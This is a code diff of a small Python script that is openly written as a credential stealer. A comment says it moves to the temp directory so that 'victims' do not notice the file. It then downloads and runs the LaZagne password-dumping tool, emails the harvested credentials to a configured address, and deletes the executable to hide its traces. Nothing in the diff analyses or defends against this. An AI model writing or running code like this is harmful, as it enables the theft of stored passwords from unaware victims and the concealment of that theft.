@@ -1,4 +1,4 @@
-import requests, platform, subprocess, smtplib, re
+import requests, platform, subprocess, smtplib, tempfile, os
 
 
 def download(url):
@@ -18,22 +18,17 @@ def send_email(sender_mail, reciever_mail, password, mail_content):
 
 os_name = platform.system()
 
-if os_name == "Windows":
+# chancce working directory for victims don't notice th laZagne.exe file
+temp_dir = tempfile.gettempdir()
+os.chdir(temp_dir)
 
-    download('https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe')
+download('https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe')
+result = subprocess.check_output('laZagne.exe all', shell=True)
 
-    result = subprocess.check_output('laZagne.exe all', shell=True)
+print(result)
 
-    print(result)
+send_email('mail', 'mail', 'password', result)
 
-    send_email('mail', 'mail', 'password', result)
+#delete file when process over
+os.remove('laZagne.exe')
 
-
-elif os_name == "Linux":
-    pass
-
-elif os_name == "Darwin":
-    pass
-
-else:
-    pass
